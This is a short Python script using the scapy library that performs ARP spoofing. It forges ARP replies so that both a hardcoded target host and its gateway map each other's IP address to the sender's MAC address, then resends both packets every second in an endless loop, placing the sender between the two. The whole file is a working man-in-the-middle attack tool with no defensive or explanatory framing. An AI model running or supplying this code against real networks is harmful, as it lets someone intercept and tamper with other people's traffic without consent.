import time
from scapy.all import ARP, Ether, sendp

def arp(src_mac, gateway_ip, tgt_mac, tgt_ip):
    eth = Ether(src = src_mac, dst = tgt_mac)
    arp = ARP(hwsrc = src_mac, psrc = gateway_ip, hwdst = tgt_mac, pdst = tgt_ip, op = "is-at")
    pkt = eth / arp
    return pkt

if __name__ == '__main__':
    tgt_ip = '192.168.4.153'
    tgt_mac = '40:4e:36:e0:38:b6'
    gateway_ip = '192.168.1.1'
    gateway_mac = '70:4c:a5:66:e4:66'
    # src_mac = 'd0:17:c2:09:a9:25'
    src_mac = '10:02:b5:c9:24:67'

    input('enter')

    pkt_station = arp(src_mac, gateway_ip, tgt_mac, tgt_ip)
    pkt_gateway = arp(src_mac, tgt_ip, gateway_mac, gateway_ip)

    while True:
        sendp(pkt_station)
        sendp(pkt_gateway)
        time.sleep(1)